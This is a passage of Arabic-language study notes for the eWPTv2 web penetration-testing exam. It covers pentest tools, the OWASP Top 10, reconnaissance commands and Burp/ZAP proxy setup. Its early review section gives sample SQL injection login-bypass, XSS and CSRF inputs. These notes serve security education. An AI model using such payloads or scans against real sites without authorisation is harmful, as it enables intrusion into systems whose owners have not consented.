---
title: "eWPTv2 Study Notes"
published: 2026-09-07
description: "practical notes covering the eWPTv2 certification"
image: "eWPTv2.png"
tags:
  - "eWPTv2"
  - "Web Application Security"
  - "CMS Security"
  - "Web Security"
  - "Enumeration"
category: "Courses Notes"
lang: "ar"
---

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
.ewpt-rtl-notes{
    --bg: #0f1216;
    --panel: #161b22;
    --panel-2: #1c222b;
    --border: #2a323d;
    --text: #e6e9ee;
    --text-dim: #a6adb8;
    --accent: #4fd1c5;
    --accent-2: #f4b740;
    --danger: #ef6a6a;
    --code-bg: #0d1117;
    --radius: 12px;
  }
.ewpt-rtl-notes *{ box-sizing: border-box; }
.ewpt-rtl-notes{
    margin:0; padding:0;
    background: var(--bg);
    color: var(--text);
    font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
    direction: rtl;
    text-align: right;
    line-height: 1.9;
    font-size: 17px;
  }
.ewpt-rtl-notes .wrap{
    max-width: 980px;
    margin: 0 auto;
    padding: 40px 24px 100px;
  }
.ewpt-rtl-notes header.hero{
    background: linear-gradient(135deg, #16222b 0%, #10151b 100%);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    padding: 40px 32px;
    margin-bottom: 36px;
    position: relative;
    overflow: hidden;
  }
.ewpt-rtl-notes header.hero::before{
    content:"";
    position:absolute;
    inset: -40% -10% auto auto;
    width: 320px; height: 320px;
    background: radial-gradient(circle, rgba(79,209,197,0.18), transparent 70%);
    pointer-events: none;
  }
.ewpt-rtl-notes .eyebrow{
    display:inline-block;
    font-family: 'IBM Plex Mono', monospace;
    font-size: 13px;
    letter-spacing: 0.5px;
    color: var(--accent);
    background: rgba(79,209,197,0.08);
    border: 1px solid rgba(79,209,197,0.35);
    padding: 5px 12px;
    border-radius: 999px;
    margin-bottom: 18px;
  }
.ewpt-rtl-notes h1.title{
    font-size: 32px;
    font-weight: 800;
    margin: 0 0 12px;
    line-height: 1.5;
  }
.ewpt-rtl-notes .subtitle{
    color: var(--text-dim);
    font-size: 16.5px;
    max-width: 700px;
    margin: 0;
  }
.ewpt-rtl-notes nav.toc{
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    padding: 24px 28px;
    margin-bottom: 40px;
  }
.ewpt-rtl-notes nav.toc h2{
    margin: 0 0 16px;
    font-size: 18px;
    color: var(--accent-2);
  }
.ewpt-rtl-notes nav.toc ol{
    margin: 0; padding-inline-start: 22px;
    columns: 2;
    gap: 28px;
  }
.ewpt-rtl-notes nav.toc li{ margin-bottom: 10px; break-inside: avoid; }
.ewpt-rtl-notes nav.toc a{
    color: var(--text);
    text-decoration: none;
    border-bottom: 1px dashed transparent;
    transition: border-color .15s, color .15s;
  }
.ewpt-rtl-notes nav.toc a:hover{ color: var(--accent); border-color: var(--accent); }
@media (max-width: 640px){
.ewpt-rtl-notes nav.toc ol{ columns: 1; }
}
.ewpt-rtl-notes section.stage{
    margin-bottom: 52px;
  }
.ewpt-rtl-notes section.stage > h2{
    display:flex;
    align-items:center;
    gap: 14px;
    font-size: 24px;
    font-weight: 800;
    color: var(--text);
    border-bottom: 2px solid var(--border);
    padding-bottom: 14px;
    margin: 0 0 22px;
  }
.ewpt-rtl-notes section.stage > h2 .num{
    flex: 0 0 auto;
    width: 38px; height: 38px;
    display:flex; align-items:center; justify-content:center;
    background: var(--accent);
    color: #0b1014;
    border-radius: 10px;
    font-family: 'IBM Plex Mono', monospace;
    font-weight: 700;
    font-size: 16px;
  }
.ewpt-rtl-notes h3{
    font-size: 19px;
    font-weight: 700;
    color: var(--accent-2);
    margin: 30px 0 12px;
  }
.ewpt-rtl-notes h4{
    font-size: 16.5px;
    font-weight: 700;
    color: var(--text);
    margin: 22px 0 8px;
  }
.ewpt-rtl-notes p{ margin: 0 0 16px; color: var(--text); }
.ewpt-rtl-notes .dim{ color: var(--text-dim); }
.ewpt-rtl-notes ul, .ewpt-rtl-notes ol.plain{
    margin: 0 0 16px;
    padding-inline-start: 26px;
  }
.ewpt-rtl-notes li{ margin-bottom: 8px; }
.ewpt-rtl-notes strong{ color: var(--accent-2); font-weight: 700; }
.ewpt-rtl-notes .pipeline{
    display:flex;
    flex-wrap: wrap;
    gap: 10px;
    align-items:center;
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    padding: 20px;
    margin: 18px 0 24px;
    font-family: 'IBM Plex Mono', monospace;
    font-size: 14.5px;
  }
.ewpt-rtl-notes .pipeline .step{
    background: var(--panel-2);
    border: 1px solid var(--border);
    color: var(--accent);
    padding: 8px 14px;
    border-radius: 8px;
    white-space: nowrap;
  }
.ewpt-rtl-notes .pipeline .arrow{ color: var(--text-dim); }
.ewpt-rtl-notes .callout{
    border-radius: 10px;
    padding: 16px 20px;
    margin: 18px 0;
    border-right: 4px solid var(--accent);
    background: rgba(79,209,197,0.06);
  }
.ewpt-rtl-notes .callout.example{
    border-right-color: var(--accent-2);
    background: rgba(244,183,64,0.07);
  }
.ewpt-rtl-notes .callout.warning{
    border-right-color: var(--danger);
    background: rgba(239,106,106,0.08);
  }
.ewpt-rtl-notes .callout .label{
    display:block;
    font-family: 'IBM Plex Mono', monospace;
    font-size: 12.5px;
    letter-spacing: 0.4px;
    font-weight: 700;
    margin-bottom: 8px;
  }
.ewpt-rtl-notes .callout.example .label{ color: var(--accent-2); }
.ewpt-rtl-notes .callout.warning .label{ color: var(--danger); }
.ewpt-rtl-notes .callout:not(.example):not(.warning) .label{ color: var(--accent); }
.ewpt-rtl-notes .callout p:last-child{ margin-bottom: 0; }
.ewpt-rtl-notes pre{
    background: var(--code-bg);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 16px 18px;
    overflow-x: auto;
    margin: 14px 0 20px;
    direction: ltr;
    text-align: left;
  }
.ewpt-rtl-notes code{
    font-family: 'IBM Plex Mono', monospace;
    font-size: 14px;
    color: #c8f0e8;
    line-height: 1.7;
  }
.ewpt-rtl-notes p code, .ewpt-rtl-notes li code{
    background: rgba(79,209,197,0.1);
    color: var(--accent);
    padding: 2px 7px;
    border-radius: 5px;
    font-size: 14px;
    direction: ltr;
    display: inline-block;
  }
.ewpt-rtl-notes .table-wrap{
    overflow-x: auto;
    margin: 16px 0 24px;
    border: 1px solid var(--border);
    border-radius: 10px;
  }
.ewpt-rtl-notes table{
    width: 100%;
    border-collapse: collapse;
    font-size: 15px;
    background: var(--panel);
  }
.ewpt-rtl-notes thead th{
    background: var(--panel-2);
    color: var(--accent-2);
    text-align: right;
    padding: 12px 16px;
    font-weight: 700;
    border-bottom: 2px solid var(--border);
    white-space: nowrap;
  }
.ewpt-rtl-notes tbody td{
    padding: 12px 16px;
    border-bottom: 1px solid var(--border);
    vertical-align: top;
  }
.ewpt-rtl-notes tbody tr:last-child td{ border-bottom: none; }
.ewpt-rtl-notes tbody tr:hover{ background: rgba(255,255,255,0.02); }
.ewpt-rtl-notes td code{ direction: ltr; display:inline-block; }
.ewpt-rtl-notes hr.section-divider{
    border: none;
    border-top: 1px solid var(--border);
    margin: 44px 0;
  }
.ewpt-rtl-notes footer{
    text-align:center;
    color: var(--text-dim);
    font-size: 14px;
    margin-top: 60px;
    padding-top: 24px;
    border-top: 1px solid var(--border);
  }
.ewpt-rtl-notes a.back-to-top{
    display:inline-block;
    margin-top: 10px;
    font-size: 13px;
    color: var(--accent);
    text-decoration:none;
  }
</style>
<div class="ewpt-rtl-notes">
<div class="wrap">
  <header class="hero" id="top">
    <span class="eyebrow">PENTESTING NOTES · eWPTv2</span>
    <h1 class="title">نوتس eWPTv2 — دليل شامل خطوة بخطوة لاختبار اختراق تطبيقات الويب</h1>
    <p class="subtitle">
      بعد نوتس eJPTv2، دي نوتس مخصصة لاختبار اختراق تطبيقات الويب بالتفصيل، لأن الجزء ده من أكتر الأجزاء اللي
      بتحتاج ممارسة عملية مكثفة، مش مجرد حفظ مفاهيم. تغطي كل حاجة من جمع المعلومات وحتى منطق العمل (Business Logic)،
      مع شرح للمفاهيم، الأدوات، وأمثلة عملية لكل جزء.
    </p>
  </header>
  <nav class="toc">
    <h2>محتويات النوتس</h2>
    <ol>
      <li><a href="#toolkit">أدوات الكورس الأساسية</a></li>
      <li><a href="#intro">مقدمة عن اختبار أمان تطبيقات الويب</a></li>
      <li><a href="#info-gathering">جمع المعلومات (Information Gathering)</a></li>
      <li><a href="#web-proxies">البروكسيات (Web Proxies)</a></li>
      <li><a href="#xss">Cross-Site Scripting (XSS)</a></li>
      <li><a href="#sqli">SQL Injection</a></li>
      <li><a href="#common-attacks">الهجمات الشائعة (Common Attacks)</a></li>
      <li><a href="#file-attacks">هجمات الملفات والموارد (File & Resource Attacks)</a></li>
      <li><a href="#web-services">خدمات الويب (Web Services)</a></li>
      <li><a href="#cms">اختبار أنظمة إدارة المحتوى (CMS Pentesting)</a></li>
      <li><a href="#encoding">الترميز والتصفية (Encoding & Filtering)</a></li>
      <li><a href="#api-jwt">أمان الـ API و JWT</a></li>
      <li><a href="#ssrf-cors">SSRF وInsecure Deserialization وCORS وClickjacking</a></li>
      <li><a href="#business-logic">منطق العمل والـ Rate Limiting</a></li>
      <li><a href="#appendix-reference">ملحق: مرجع سريع</a></li>
      <li><a href="#appendix-report">ملحق: قالب تقرير اختبار اختراق</a></li>
    </ol>
  </nav>
  <section class="stage" id="toolkit">
    <h2 style="border-bottom:none; margin-bottom:12px;">🧰 أدوات الكورس الأساسية</h2>
    <p>
      قبل أي حاجة، دي تجميعة لكل الأدوات اللي هتحتاجها في عملية البينتيست بتاعتك، ومعاها أوامر التثبيت السريع.
    </p>
    <div class="table-wrap">
      <table>
        <thead><tr><th>الأداة</th><th>الوصف</th><th>التثبيت</th></tr></thead>
        <tbody>
          <tr><td>Burp Suite</td><td>تحليل واختبار أمان تطبيقات الويب</td><td><code>sudo apt update &amp;&amp; sudo apt install burpsuite</code></td></tr>
          <tr><td>OWASP ZAP</td><td>أداة مجانية ومفتوحة المصدر لاختبار أمان الويب</td><td><code>sudo apt update &amp;&amp; sudo apt install zaproxy</code></td></tr>
          <tr><td>Nikto</td><td>ماسح أمني للثغرات المعروفة في خدمات الويب</td><td><code>sudo apt update &amp;&amp; sudo apt install nikto</code></td></tr>
          <tr><td>SQLMap</td><td>أداة آلية لاكتشاف واستغلال ثغرات SQL Injection</td><td><code>sudo apt update &amp;&amp; sudo apt install sqlmap</code></td></tr>
          <tr><td>W3af</td><td>إطار عمل كامل لاختبار أمان تطبيقات الويب</td><td><code>sudo apt update &amp;&amp; sudo apt install w3af</code></td></tr>
          <tr><td>Metasploit Framework</td><td>تطوير الثغرات واختبارها</td><td><code>sudo apt update &amp;&amp; sudo apt install metasploit-framework</code></td></tr>
          <tr><td>Skipfish</td><td>ماسح أمان لتطبيقات الويب</td><td><code>sudo apt update &amp;&amp; sudo apt install skipfish</code></td></tr>
          <tr><td>Commix</td><td>اختبار ثغرات Command Injection</td><td><code>sudo apt update &amp;&amp; sudo apt install commix</code></td></tr>
          <tr><td>RIPS</td><td>تحليل الكود المصدري واكتشاف الثغرات</td><td>تحميل من الموقع الرسمي</td></tr>
          <tr><td>XSStrike</td><td>اختبار ثغرات XSS</td><td><code>git clone https://github.com/s0md3v/XSStrike.git</code></td></tr>
          <tr><td>AFL (American Fuzzy Lop)</td><td>أداة Fuzzing</td><td><code>sudo apt update &amp;&amp; sudo apt install afl</code></td></tr>
          <tr><td>Grendel-Scan</td><td>فحص أمان تطبيقات الويب</td><td>تحميل من الموقع الرسمي</td></tr>
          <tr><td>Amass</td><td>استكشاف نطاقات فرعية وتخطيط سطح الهجوم بشكل شامل</td><td><code>sudo apt install amass</code></td></tr>
          <tr><td>WPScan</td><td>فحص متخصص لمواقع WordPress</td><td><code>sudo apt install wpscan</code></td></tr>
          <tr><td>ffuf</td><td>أداة Fuzzing سريعة جدًا للمسارات والباراميترات</td><td><code>go install github.com/ffuf/ffuf@latest</code></td></tr>
        </tbody>
      </table>
    </div>
    <p><strong>XSStrike تثبيت كامل:</strong></p>
    <pre><code>git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt</code></pre>
    <div class="callout">
      <span class="label">ملاحظة تنظيمية</span>
      <p>
        الأفضل إنك تعمل مجلد واحد مخصص للأدوات دي (زي <code>~/tools/</code>) وتحط كل أداة متنزلة من GitHub جواه،
        بدل ما تتوزع في أماكن عشوائية على الجهاز — هيوفر عليك وقت كتير وقت ما تدور على أداة معينة بعد فترة.
      </p>
    </div>
  </section>
  <hr class="section-divider">
  <!-- ============ 1. INTRO ============ -->
  <section class="stage" id="intro">
    <h2><span class="num">1</span> مقدمة عن اختبار أمان تطبيقات الويب</h2>
    <p>
      قبل ما تدخل في أي تفصيلة تقنية، لازم تكون فاهم الصورة الكبيرة: اختبار اختراق تطبيقات الويب هو محاولة منظمة
      لاكتشاف الثغرات في تطبيق ويب قبل ما حد يستغلها بنية سيئة. الفرق عن اختبار اختراق الشبكات إن التركيز هنا بيبقى
      على منطق التطبيق نفسه — إزاي بيتعامل مع المدخلات، إزاي بيدير الجلسات والمصادقة، وإزاي بيتفاعل مع قاعدة البيانات
      والملفات.
    </p>
    <h3>مرجع OWASP Top 10</h3>
    <p>
      قبل ما تبدأ أي اختبار، من المفيد جدًا إنك تكون عارف قائمة OWASP Top 10 — دي أخطر عشر فئات ثغرات في تطبيقات
      الويب حسب إحصائيات OWASP، ومعظم اللي هتقابله هنا بيقع تحت واحدة منهم:
    </p>
    <div class="table-wrap">
      <table>
        <thead><tr><th>الترتيب</th><th>الفئة</th></tr></thead>
        <tbody>
          <tr><td>A01</td><td>Broken Access Control</td></tr>
          <tr><td>A02</td><td>Cryptographic Failures</td></tr>
          <tr><td>A03</td><td>Injection (SQLi, XSS, Command Injection...)</td></tr>
          <tr><td>A04</td><td>Insecure Design</td></tr>
          <tr><td>A05</td><td>Security Misconfiguration</td></tr>
          <tr><td>A06</td><td>Vulnerable &amp; Outdated Components</td></tr>
          <tr><td>A07</td><td>Identification &amp; Authentication Failures</td></tr>
          <tr><td>A08</td><td>Software &amp; Data Integrity Failures</td></tr>
          <tr><td>A09</td><td>Security Logging &amp; Monitoring Failures</td></tr>
          <tr><td>A10</td><td>Server-Side Request Forgery (SSRF)</td></tr>
        </tbody>
      </table>
    </div>
    <p class="dim">هنا هبدأ بمراجعة سريعة جدًا لأشهر الثغرات، وبعدين هفصّل كل واحدة منهم لاحقًا في السكاشن المخصصة ليها.</p>
    <h3>1. جمع المعلومات (Information Gathering)</h3>
    <h4>ليه بنجمع معلومات؟</h4>
    <p>دي أول خطوة، عشان نفهم التطبيق اللي بنختبره، نعرف إيه التقنيات المستخدمة فيه، ونتعرف على نقاط ضعفه المحتملة.</p>
    <ul>
      <li><strong>Nmap:</strong> بيساعدك تعرف المنافذ المفتوحة على السيرفر</li>
      <li><strong>WHOIS Lookup:</strong> عشان تعرف معلومات عن المالك والمزود</li>
    </ul>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>لو عندك موقع اسمه <code>Netriders.academy</code>، ممكن تستخدم Nmap كده:</p>
      <pre><code>nmap -sS Netriders.academy</code></pre>
      <p>ده هيظهرلك المنافذ المفتوحة والخدمات المتاحة على السيرفر.</p>
    </div>
    <h3>2. التعرف على المكونات (Component Recognition)</h3>
    <h4>إيه المكونات دي؟</h4>
    <p>دي المكتبات والإضافات المستخدمة في التطبيق. لو عرفتهم، ممكن تلاقي ثغرات معروفة فيهم.</p>
    <ul>
      <li><strong>Wappalyzer:</strong> إضافة للمتصفح بتقولك التقنيات المستخدمة في أي موقع</li>
      <li><strong>BuiltWith:</strong> موقع تاني مفيد لمعرفة التقنيات</li>
    </ul>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>ممكن تستخدم Wappalyzer على <code>example.com</code> وتشوف إذا كان فيه مكتبات معروفة زي jQuery أو أنظمة إدارة محتوى زي WordPress.</p>
    </div>
    <h3>3. اختبار الثغرات الشائعة (مراجعة سريعة)</h3>
    <h4>أ. SQL Injection</h4>
    <p>طريقة بتسمح لك تخترق قاعدة البيانات من خلال إدخال بيانات خبيثة. مثال:</p>
    <pre><code>http://example.com/login.php?user=admin' OR '1'='1' -- &pass=12345</code></pre>
    <p>لو دخلت، يبقى فيه ثغرة SQL Injection.</p>
    <h4>ب. Cross-Site Scripting (XSS)</h4>
    <p>إنك تحط كود JavaScript ضار في التطبيق. مثال:</p>
    <pre><code>&lt;script&gt;alert('XSS Attack');&lt;/script&gt;</code></pre>
    <p>لو ظهرت الرسالة، التطبيق معرض لهجوم XSS.</p>
    <h4>ج. Cross-Site Request Forgery (CSRF)</h4>
    <p>إنك تخلي المستخدم ينفذ عمليات بدون ما يعرف، زي تغيير كلمة السر. مثال:</p>
    <pre><code>http://example.com/change-password?newpass=12345</code></pre>
    <p>لو المستخدم ضغط على الرابط، هتتغير كلمة السر من غير ما يعرف.</p>
    <h3>4. تحليل الاستجابة (Response Analysis)</h3>
    <h4>ليه بنحلل الاستجابة؟</h4>
    <p>عشان نعرف إزاي التطبيق بيستجيب للأوامر. لو فيه معلومات حساسة أو أخطاء مفيدة، ده هيساعدنا نكتشف الثغرات.</p>
    <p>أدوات نستخدمها: <strong>Burp Suite</strong>، <strong>OWASP ZAP</strong> لالتقاط وتحليل الطلبات والردود.</p>
    <h3>5. تقرير النتائج (Reporting)</h3>
    <p><strong>عناصر التقرير الأساسية:</strong></p>
    <ul>
      <li><strong>الوصف:</strong> تفاصيل الثغرة وأثرها</li>
      <li><strong>خطوات الإصلاح:</strong> إزاي نصلح الثغرة</li>
      <li><strong>الأهمية:</strong> مدى خطورة الثغرة، ويفضل تحديدها برقم CVSS لو ممكن</li>
    </ul>
    <div class="callout example">
      <span class="label">مثال</span>
      <p>
        لو اكتشفت SQL Injection، تكتب: "فيه ثغرة SQL Injection في نموذج تسجيل الدخول" مع توصية "استخدم الاستعلامات
        المحضرة (Prepared Statements) بدل الاستعلامات الديناميكية".
      </p>
    </div>
    <p class="dim">دي كانت مراجعة سريعة جدًا لبعض الثغرات، ممكن تتخطاها بدون مشكلة لو عايز تروح على طول للتفاصيل الكاملة تحت.</p>
  </section>
  <hr class="section-divider">
  <!-- ============ 2. INFO GATHERING ============ -->
  <section class="stage" id="info-gathering">
    <h2><span class="num">2</span> جمع المعلومات (Information Gathering) — بالتفصيل</h2>
    <p>السكشن ده هنعيد فيه اللي اتشرح فوق، لكن بتفاصيل أكتر شوية، وبيغطي: Finding Website Ownership &amp; IP Addresses، Reviewing Webserver Metafiles، Search Engine Discovery، Web App Fingerprinting، Source Code Analysis، Website Crawling &amp; Spidering، Web Server Fingerprinting، DNS Enumeration، Subdomain Enumeration، Web App Vulnerability Scanning، وAutomated Recon Frameworks.</p>
    <h3>مقدمة</h3>
    <p>جمع المعلومات عن المواقع هي أول خطوة في أي اختبار اختراق. الهدف إنك تجمع كل حاجة تقدر عليها عن الموقع المستهدف عشان تحدد نقاط الضعف اللي ممكن تستغلها.</p>
    <h3>Passive vs Active — إيه الفرق عمليًا؟</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>النوع</th><th>طبيعته</th><th>أمثلة</th><th>فرصة الاكتشاف</th></tr></thead>
        <tbody>
          <tr><td>Passive</td><td>من غير أي تفاعل مباشر مع الهدف</td><td>WHOIS، Google Dorking، Shodan، سجلات DNS العامة</td><td>شبه معدومة</td></tr>
          <tr><td>Active</td><td>تفاعل مباشر مع أنظمة الهدف</td><td>Port Scanning، Directory Brute-forcing، Banner Grabbing</td><td>موجودة، وبتزيد كل ما زاد عدد الطلبات</td></tr>
        </tbody>
      </table>
    </div>
    <p class="dim">القاعدة العملية: ابدأ دايمًا بالـ Passive لحد ما تجمع أكبر قدر من المعلومات، وبعدين انتقل للـ Active بعد ما تكون عارف حدود الـ Scope بدقة.</p>
    <h3>إزاي تعرف ملكية الموقع وعناوين الـ IP</h3>
    <ul>
      <li><strong>WHOIS:</strong> بيعرفك مين صاحب النطاق، الاسم، البريد الإلكتروني، وأحيانًا العنوان. تقدر تستخدم <code>whois.domaintools.com</code></li>
      <li><strong>DNS Lookup:</strong> أدوات زي <code>nslookup</code> أو <code>dig</code> بتعرفك عنوان الـ IP بتاع الموقع من اسم النطاق</li>
    </ul>
    <pre><code>dig example.com A
dig example.com MX</code></pre>
    <h3>مراجعة ملفات الميتا عشان تعرف معلومات مسربة</h3>
    <ul>
      <li>ملفات زي <code>robots.txt</code> و<code>humans.txt</code> بتبقى فيها أحيانًا معلومات مهمة بتكشف مسارات أو ملفات مش مفروض تكون ظاهرة للعامة</li>
      <li><code>sitemap.xml</code>: بيبقى عشان محركات البحث تفهرس الموقع، وأحيانًا بيكون فيه مسارات لصفحات مش ظاهرة للمستخدم العادي</li>
    </ul>
    <h3>البحث عن المعلومات باستخدام محركات البحث</h3>
    <p><strong>Google Dorking</strong> — أوامر بحث متقدمة في جوجل لجلب معلومات حساسة:</p>
    <pre><code>site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"
site:example.com ext:sql | ext:env | ext:log
site:example.com inurl:wp-content</code></pre>
    <p><strong>Shodan</strong> — نفس الفكرة بس على مستوى الأجهزة المتصلة بالإنترنت مباشرة:</p>
    <pre><code>org:"Example Company"
hostname:example.com</code></pre>
    <p class="dim">
      الصفحات المؤرشفة: جوجل بيحتفظ بنسخ من الصفحات القديمة، وموقع <code>web.archive.org</code> (Wayback Machine)
      بيحتفظ بنسخ تاريخية كاملة من الموقع، أحيانًا تلاقي فيها معلومات اتحذفت من الموقع الحالي.
    </p>
    <h3>بصمة تطبيق الويب</h3>
    <ul>
      <li><strong>HTTP Headers:</strong> الرد اللي بييجي بعد أي طلب ممكن يحتوي على معلومات عن نوع السيرفر وإصداره. أدوات زي Wappalyzer وBuiltWith بتحدد لك الأدوات المستخدمة</li>
      <li><strong>صفحات الأخطاء (404):</strong> أحيانًا بتوضح نوع الخادم أو التطبيقات المستخدمة</li>
    </ul>
    <h3>تحليل الشيفرة المصدرية للموقع</h3>
    <ul>
      <li><strong>عرض الكود المصدري:</strong> ممكن تلاقي تعليقات أو نصوص مخفية فيها معلومات مفيدة</li>
      <li><strong>GitLeaks:</strong> لاكتشاف أي تسريبات بيانات في مستودعات الكود زي Git</li>
    </ul>
    <h3>الزحف والتجسس على الموقع</h3>
    <ul>
      <li><strong>OWASP ZAP و Burp Suite:</strong> بتعمل فحص شامل للموقع وتجيب كل الروابط والصفحات</li>
      <li><strong>Spiders:</strong> بتزحف عبر الموقع وتتبع الروابط كلها عشان تجمع معلومات عن هيكل الموقع</li>
    </ul>
    <h3>تحديد بصمة الخادم</h3>
    <ul>
      <li><strong>Nmap:</strong> لتحديد إصدار الخادم ونظام التشغيل، والمنافذ المفتوحة، ونوع الخادم (Apache، IIS...)</li>
      <li><strong>Banner Grabbing:</strong> استخلاص معلومات عن الخادم من الرد اللي بييجي من الشبكة</li>
    </ul>
    <pre><code>nc -nv example.com 80
HEAD / HTTP/1.1
Host: example.com</code></pre>
    <h3>استكشاف DNS</h3>
    <ul>
      <li><strong>dnsenum:</strong> لمعرفة كل سجلات DNS زي عناوين الـ IP والخوادم الداخلية</li>
      <li><strong>Reverse DNS Lookup:</strong> لمعرفة النطاقات المرتبطة بعنوان IP معين</li>
    </ul>
    <h3>استكشاف النطاقات الفرعية</h3>
    <ul>
      <li><strong>Sublist3r و Amass:</strong> للدوران على النطاقات الفرعية المرتبطة بالنطاق الرئيسي — النطاقات دي ممكن تكون فيها تطبيقات غير مؤمنة كويس</li>
      <li><strong>Brute-force Subdomains:</strong> تقنيات لتجربة أسماء نطاقات فرعية محتملة</li>
    </ul>
    <pre><code>amass enum -d example.com</code></pre>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>
        الموقع الرئيسي <code>example.com</code> كان مؤمن كويس ومعمول عليه WAF قوي، لكن Amass طلع لي نطاق فرعي
        <code>old-portal.example.com</code> مكانش موجود في أي مكان ظاهر في الموقع الرئيسي — واتضح إنه نسخة تجريبية
        قديمة من التطبيق، منسي، وشغال بإعدادات افتراضية وبدون أي حماية. النطاقات الفرعية المنسية دي غالبًا بتبقى
        أسهل نقطة دخول.
      </p>
    </div>
    <h3>فحص ثغرات تطبيقات الويب</h3>
    <ul>
      <li><strong>Nikto و Acunetix:</strong> فحص شامل للموقع عن ثغرات معروفة زي XSS وSQL Injection</li>
      <li><strong>Fuzzing:</strong> إرسال بيانات عشوائية أو معدلة للموقع ومراقبة استجابة السيرفر لاكتشاف الثغرات</li>
    </ul>
    <h3>أطر العمل الآلية للتجسس</h3>
    <ul>
      <li><strong>Recon-ng:</strong> إطار عمل مفتوح المصدر بيجمع المعلومات من مصادر كتير وبينظمها</li>
      <li><strong>SpiderFoot:</strong> أداة آلية بتجمع معلومات من محركات البحث وسجلات DNS وبتحلل الروابط بين البيانات</li>
    </ul>
  </section>
  <hr class="section-divider">
  <!-- ============ 3. WEB PROXIES ============ -->
  <section class="stage" id="web-proxies">
    <h2><span class="num">3</span> البروكسيات (Web Proxies)</h2>
    <p>السكشن ده بيغطي: Burp Suite &amp; OWASP ZAP، إعداد البروكسي، الواجهات، الـ Intruder وأنماطه، وDirectory Enumeration وهجمات النماذج.</p>
    <h3>مقدمة عن البروكسيات</h3>
    <p>
      البروكسيات بتساعدك تشوف كل الترافيك اللي بيعدي بين المتصفح والخادم وتعدله لو حابب. يعني، لما تدخل على موقع،
      تقدر تشوف كل الطلبات والاستجابات اللي بتتبعت للموقع، وتقدر تعدل فيها قبل ما توصل. الأدوات دي مهمة جدًا عشان
      تكتشف ثغرات زي SQL Injection وXSS.
    </p>
    <h3>Burp Suite مقابل OWASP ZAP — إيه الفرق عمليًا؟</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>المعيار</th><th>Burp Suite</th><th>OWASP ZAP</th></tr></thead>
        <tbody>
          <tr><td>التكلفة</td><td>Community مجانية بميزات محدودة، Pro مدفوعة</td><td>مجانية بالكامل ومفتوحة المصدر</td></tr>
          <tr><td>سهولة الاستخدام للمبتدئين</td><td>متوسطة</td><td>أسهل شوية</td></tr>
          <tr><td>قوة الأتمتة</td><td>ممتازة في النسخة Pro</td><td>جيدة جدًا وبتتحسن باستمرار</td></tr>
          <tr><td>الأنسب لـ</td><td>الاستخدام الاحترافي والمكثف</td><td>البداية والتعلم والمشاريع مفتوحة المصدر</td></tr>
        </tbody>
      </table>
    </div>
    <h3>إعداد بروكسي Burp</h3>
    <p>
      لما تفتح Burp، هتلاقي في Proxy Tab إعدادات تشغيل البروكسي. بعدها تروح للمتصفح وتعدل إعدادات الشبكة عشان
      الترافيك يعدي من خلال Burp. العنوان هيبقى <code>127.0.0.1</code> والبورت غالبًا <code>8080</code>.
    </p>
    <h4>لوحة التحكم والواجهة في Burp Suite</h4>
    <div class="table-wrap">
      <table>
        <thead><tr><th>التاب</th><th>الوظيفة</th></tr></thead>
        <tbody>
          <tr><td>Dashboard</td><td>ملخص عن كل الفحصات والهجمات الشغالة</td></tr>
          <tr><td>Target</td><td>تحديد الموقع اللي عايز تفحصه</td></tr>
          <tr><td>Proxy</td><td>مشاهدة الطلبات اللي بتتبعت وتعديلها</td></tr>
          <tr><td>Intruder</td><td>هجمات زي Brute Force أو اختبار مدخلات مختلفة</td></tr>
          <tr><td>Repeater</td><td>إرسال نفس الطلب مرة ورا التانية مع تعديلات صغيرة</td></tr>
          <tr><td>Sequencer</td><td>تحليل مدى قوة الرموز (Tokens) المستخدمة في الجلسات</td></tr>
          <tr><td>Decoder</td><td>فك أو تشفير البيانات</td></tr>
        </tbody>
      </table>
    </div>
    <h4>أنواع الهجوم في Intruder</h4>
    <p>الـ Intruder فيه 4 أنماط هجوم مختلفة، والفرق بينهم مهم جدًا تفهمه:</p>
    <div class="table-wrap">
      <table>
        <thead><tr><th>النمط</th><th>طريقة عمله</th><th>استخدام مناسب</th></tr></thead>
        <tbody>
          <tr><td>Sniper</td><td>يجرب كل قيمة على نقطة واحدة بالتبادل</td><td>اختبار باراميتر واحد بقايمة قيم</td></tr>
          <tr><td>Battering Ram</td><td>نفس القيمة على كل النقاط في نفس الوقت</td><td>تجربة نفس الـ Payload في أكتر من مكان مع بعض</td></tr>
          <tr><td>Pitchfork</td><td>قيم مختلفة متزامنة من قوائم متعددة</td><td>تجربة زوج Username/Password من قائمتين مرتبطتين</td></tr>
          <tr><td>Cluster Bomb</td><td>كل التوافيقات الممكنة بين القوائم</td><td>Brute Force شامل لأكتر من باراميتر مع بعض</td></tr>
        </tbody>
      </table>
    </div>
    <h3>إعداد بروكسي OWASP ZAP وشهادة المتصفح</h3>
    <p>
      في Options بتضبط إعدادات البروكسي (نفس العنوان والبورت زي Burp غالبًا). عشان تقدر تتجسس على مواقع HTTPS،
      لازم تضيف شهادة ZAP للمتصفح — هتلاقيها في ZAP's Root CA، وبتضيفها في إعدادات أمان المتصفح.
    </p>
    <h4>لوحة التحكم والواجهة في OWASP ZAP</h4>
    <div class="table-wrap">
      <table>
        <thead><tr><th>التاب</th><th>الوظيفة</th></tr></thead>
        <tbody>
          <tr><td>Dashboard</td><td>ملخص عن الفحصات والثغرات المكتشفة</td></tr>
          <tr><td>Sites</td><td>المواقع اللي اشتغلت عليها مرتبة حسب الدومين</td></tr>
          <tr><td>History</td><td>كل الطلبات اللي عدت من خلال ZAP</td></tr>
          <tr><td>Active Scan</td><td>فحص شامل للموقع عن ثغرات</td></tr>
          <tr><td>Spider</td><td>زحف على الموقع لجمع كل الصفحات والروابط</td></tr>
